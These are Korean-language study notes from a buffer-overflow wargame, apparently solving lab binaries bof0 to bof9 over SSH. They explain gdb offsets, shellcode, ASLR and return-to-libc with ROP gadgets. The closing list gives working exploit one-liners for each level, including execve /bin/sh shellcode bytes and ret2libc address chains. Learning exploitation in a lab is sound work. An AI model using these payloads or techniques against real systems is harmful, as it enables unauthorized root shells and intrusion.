ssh bof0@13.125.71.164 : 접속

bat bof0.c : 소스코드 보기 

ssh bof숫자@13.125.71.164
ssh bof9@13.125.233.235

python -c "print('a'*100)"

./bof2 `python -c "print('a'*5)"`

python -c "print('a'*100)" | ./bof0

setuid = 실행할 때 만큼은 root 권한이 됨. ( (rw)s 가 붙은 경우)

setuid 비트 : find /tmp/test -perm -4000 -ls
setgid 비트 : find /tmp/test -perm -2000 -ls
sticky 비트 : find /tmp/test -perm -1000 -ls

find . -perm -4000 -ls : setuid 가 적용된 것 찾는 명령어 

sudo gdb  bof0

i r rsp : rsp 알아보기 명령  gdb 

p/d rsp 변화량  : 처음부터 끝까지의 byte 사용량 ( gdb 안에서 )

plt got

ldd bof2

static : printf를 쓰면 실행할 때마다 printf 메모리가 붙어 용량 낭비
dynamic : main 프로그램에 실행할 때 (ex) printf) plt (주소록)을 가져와 용량 절약 

echo aaa | ./program 

왼쪽 input 파이프가 닫히면 오른쪽도 닫힘 
그래서 cat 명령어를 활용하면 열리게됨.
python -c "print 'a\x00\x00\x00' *36";cat) | ./bof3

;(세미콜론) 앞이 끝나면 뒤를 출력해라
0 <- stdin ( standard input)
1 <- stdout
2 <- stderr

0x12345678 = /x78/x56/x34/x12  2바이트씩 표현한 것 

vuln 함수 시작점  i r rsp
gets(buf) 의 i r rsp  

shellcode : 쉘을 실행시킬 수 있는 코드이고, 코드를 문자열로 삽입할 수 있도록 기계어 코드로 만든 것 

objdump -d hello
od -A n -t x1 hello.hex : 헥사값 알아보기 
null 바이트를 없애는 방법 

push 1
pop rax 은 
mov rax ,1 과 같다. null 바이트 없애는 방법
------------------------------------------------------------------------------------
return address 를 덮는 편법
python -c "print 'a'*1000" | ./bof6
1000에서 절반씩 줄여나가면서 계속 맞춰감.

1)
ex) 136 에서 s f 가 뜨면 
segment fault 가 뜨는 곳까지가 return address 앞까지의 크기이다.
그 이유는 문자에 널 바이트가 포함되어있어 그 널 바이트가 return address 를 건드려서 s f 가 뜨게 되는 것 
즉, 136 보다 크게 적어야 return address 가 덮힌다. 

2)
vuln 함수에 들어왔을 때 rsp 주소를 본다 . : i r rsp 
gets 함수의 rdi을 본다.
p/d 를 통해 차이를 구해준다.


shellcode + 쓰레기 값 + shell (Code) 주소 
 27 byte 	   109 byte 
shellcode + 쓰레기 값 = return address 바로 앞까지의 크기 

------------------------------------------------------------------------------------
mov rbx , 0x0a212121646c726f
push rbx
mov rbx , 0x57202c6f6c6c6548
push rbx
push rsp 
pop   rsi

6번 풀이
= 쓰레기 값* 136 + ShellCode 주소 넣기

7번
(SHELLCODE) \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05 + 쓰레기값 + 버퍼의 주소 

return을 char buf 로 뛰면 shell을 가지고 있는 곳으로 뛰게 된다.

8번 
buf size가 작아서 shellcode 못넣음 
export SHELLCODE=python ~~ 이 명령을 통해 환경 변수 조작후 
env 명령 : 환경 변수 확인  

140
"print '/bin/sh' + '\0' + 'X'(쓰레기 값 )*132 + '\x78\x56\x34\x12'"
           1234567       8   

ASLR(address space layout radndomization)
실행할 때마다 위치 값이 바뀌게 됨.

7번 
인자로 받을 때 인자가 길어지면 주소 값이 바뀌게 되어 전달하고자 하는 payload 크기가 얼마인지 구한 후
그 크기 만큼 값을 먼저 입력해서 SHELLCODE 주소를 얻어낸 후 다시 입력  

NULL 바이트 존재할 때 
\x90 : nop 코드 : 1바이트 써주고 \x00 을 \x01 로 바꿔준다. 

vmmap :   

스택에 실행 권한 없을 때
gcc test.c -z execstack 이와 같이 명령하면 스택에 실행 권한을 줌.
---------------------------------------------------------------------------------------
9번 
Return to libc ( RTL)
Text session 안에 printf ,puts, system 등이 있는데  return 에서 libc(.so) 라는 곳으로 이동 !!
return할때 return 에서 rdi 가 system("/bin/sh")을 지정하고 있어야함

ret -> pop rip 

rasm2 -b x64 'pop rdi ; ret'
=> 
이렇게 하면 return 위에 /bin/sh 가 rdi 가 되고 ; 이후 return 이 되게 된다.  (pop rdi ; ret) 

rasm2 -b x64 'nop'
=>90

ps -ef | grep a.out 

gdb 실행 중
1. vmmap 에서 구한 주소 값 

ldd bof9를 통해 
/lib/x86 64-linux-gnu/libc.so.6 이거 찾고 

2. ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" 에서 나온 주소 값 
  ( rdi ; ret ) 찾기 
두 개 더하기 

gdb 실행 중
3. (/bin/sh 주소 알아보는 명령어)  search /bin/sh :  0x7ffff7b99d57

4. ( 시스템 주소 알아보는 명령어 ) p system ( libc _ system) :  0x7ffff7a52390 

base 주소는 4개중 맨 위

쓰레기 값 | pop rdi ; ret  | /bin/sh  | system 주소 
/bin/sh 에서 ret 으로 들어감 

--------------------------------------------------------------------------------------------

libc.so 안에 printf,  system, /bin/sh , pop rdi ; ret x가 있는데 printf 로 부터 
각각의 나머지 3개까지의 거리는 항상 똑같으므로 각각의 거리를 구해준다.

p printf 
printf 주소 나옴 

pwntool 익스플로잇 코드 개발 전용 라이브러리 

파일명.py : 파이썬 파일 
python 파일명.py 파이썬 실행 

process(argv)
recvuntil(delims)
p64(number) : 리틀 엔디안으로 바꿔주는 함수 
send(data) : data를 프로세스에 입력해주는 함수 

p.interactive() : 입력 스트림과 출력 스트림을 열어줌 

cat /proc/sys/kernel/randomize_va_space 명령어를 통해서 ASLR 상태를 확인

0 일 때, ASLR 이 비활성화 상태이다.

1 일 때, ASLR 이 부분적으로 활성화된 상태이다. (스택과 라이브러리)

2 일 때, ASLR 이 완전 활성화 상태이다. (스택과 라이브러리와 힙)

printf 주소 + x = system 주소 ( x : 주소 값 사이의 거리)
printf 주소 + y = /bin/sh 주소 ( y : 주소 값 사이의 거리)
printf 주소 + z = pop rdi ; ret 주소 ( z : 주소 값 사이의 거리)
2번 : ./bof2 `python -c "print('a'*150)"`
3번 : (python -c "print'a\x00\x00\x00'*40";cat)| ./bof3
4번 : ./bof4 `python -c "print('\x78\x56\x34\x12'*36)"`
5번 : (python -c "print '/bin/sh\x00' + '\x78\x56\x34\x12' * 36 " ; cat) | ./bof5
6번 : (python -c "print 'a'*136 + '\x50\x10\x60\x00'";cat) | ./bof6
7번 : ./bof7 `python -c "print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'a'*109+'\xe0\xe3\xff\xff\xff\x7f\x00'"`
8번 : python -c "print '\x6c\x69\x6e' + 'a'*130 + '\xf0\xe4\xff\xff\xff\x7f\x00'";cat | ./bof8
9번 : (python -c "print 'a'*24 + '\x02\xe1\xa2\xf7\xff\x7f\x00\x00' + '\x57\x9d\xb9\xf7\xff\x7f\x00\x00' + '\x90\x23\xa5\xf7\xff\x7f\x00\x00'";cat) | ./bof9
